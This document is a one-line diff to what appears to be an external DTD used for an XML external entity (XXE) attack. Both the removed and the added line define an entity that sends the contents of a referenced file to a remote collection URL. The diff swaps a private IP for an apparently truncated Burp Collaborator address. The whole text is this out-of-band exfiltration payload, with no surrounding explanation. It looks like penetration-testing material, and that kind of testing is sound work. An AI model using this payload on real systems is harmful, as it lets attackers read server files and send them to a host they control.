@@ -1,1 +1,1 @@
-<!ENTITY % all "<!ENTITY send SYSTEM ‘http://10.29.22.39/?collect=%file;'>"> %all;
+<!ENTITY % all "<!ENTITY send SYSTEM ‘http://8irjyijxe5ba5l1potwsbmvxmoseg3.burpcollaborator.ne/?collect=%file;'>"> %all;
